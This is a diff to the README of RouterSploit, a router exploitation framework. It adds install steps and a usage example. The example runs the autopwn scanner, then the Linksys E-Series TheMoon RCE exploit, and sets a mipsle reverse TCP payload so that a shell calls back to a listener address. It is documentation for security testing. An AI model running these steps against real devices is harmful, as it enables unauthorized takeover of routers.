@@ -35,6 +35,11 @@ Optional:
 ## Installation on Kali Linux
 
 ```
+apt update && apt install routersploit
+```
+or
+
+```
 apt-get install python3-pip
 git clone https://www.github.com/threat9/routersploit
 cd routersploit
@@ -86,7 +91,6 @@ python3 -m pip install bluepy
 python3 rsf.py
 ```
 
-
 ## Installation on OSX
 
 ```
@@ -119,6 +123,50 @@ Update RouterSploit Framework often. The project is under heavy development and 
 cd routersploit
 git pull
 ```
+
+# Usage example
+
+RouterSploit CLI:
+# Use <tab> key multiple times for completion.
+
+# shows all modules
+rsf> show all  
+
+# searches
+rsf> search cisco
+rsf> search type=exploits
+rsf> search device=cameras
+
+# selecting a module
+rsf> use module_name
+
+# displaying the options of a selected module
+rsf> show options
+
+# setting an option of a module
+rsf> set option_name
+
+# launching a module
+csf> run
+
+Example:
+rsf > use scanners/autopwn
+rsf (AutoPwn) > 
+rsf (AutoPwn) > set target 192.168.0.1
+[+] target => 192.168.0.1
+rsf (AutoPwn) > show options
+rsf (AutoPwn) > run
+
+# if the target is vulnerable, execute the exploit
+rsf (AutoPwn) > use exploits/routers/linksys/eseries_themoon_rce
+rsf (Linksys E-Series TheMoon RCE) > show options
+rsf (Linksys E-Series TheMoon RCE) > set target 192.168.0.1
+rsf (Linksys E-Series TheMoon RCE) > run
+cmd> show payloads
+cmd > set payload mipsle/reverse_tcp
+cmd (MIPSLE Reverse TCP) > set lhost 192.168.0.30
+lhost => 192.168.0.30
+cmd (MIPSLE Reverse TCP) > run
 
 # Build your own
 To our surprise, people started to fork 
